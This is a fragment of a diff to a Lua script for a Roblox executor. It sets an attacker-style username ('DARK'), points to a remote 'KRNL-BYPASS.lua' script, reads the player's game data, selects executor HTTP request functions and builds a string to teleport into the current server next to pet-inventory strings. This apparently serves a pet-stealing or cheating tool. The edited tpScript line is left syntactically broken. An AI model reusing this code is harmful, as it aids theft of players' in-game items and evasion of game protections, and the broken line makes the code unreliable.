@@ -26,7 +26,6 @@ getgenv().Username = "DARK"
         local GetServerType = game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType")
         local TeleportService = game:GetService("TeleportService")
         local krnlbypass = "https://raw.githubusercontent.com/RblxScriptsOG/Main/refs/heads/main/KRNL-BYPASS.lua"
-        local tpScript = game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")
 
         local data = DataService:GetData()
         local maxAttempts = 10
@@ -340,7 +339,7 @@ getgenv().Username = "DARK"
 
         local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)
 
-        local tpScript = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
+        local tpScript = game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")
 
         -- Update pet string generation
         local petString = ""
